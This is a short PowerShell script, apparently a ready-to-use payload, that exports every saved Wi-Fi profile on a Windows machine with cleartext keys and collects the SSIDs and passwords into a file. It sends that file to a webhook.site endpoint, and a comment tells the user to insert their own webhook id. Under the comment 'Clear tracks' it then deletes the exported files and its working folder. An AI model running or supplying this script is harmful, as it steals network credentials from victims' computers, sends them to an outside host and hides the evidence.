# Working Directory
$wd = "C:\WiFi"
mkdir $wd
cd $wd

# Get passwords and SSIDs
netsh wlan export profile key=clear
dir *.xml |% {
$xml=[xml] (get-content $_)
$row= "---------------------`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
Out-File wifipass.txt -Append -InputObject $row
}

# Make your own webhook and insert your unique id
# https://webhook.site
Invoke-WebRequest -Uri https://webhook.site/bb11d335-fe99-49ef-ae73-2a2a8cd22d75 -Method POST -InFile wifipass.txt

# Clear tracks
rm *.xml
rm *.txt
cd ..
rm WiFi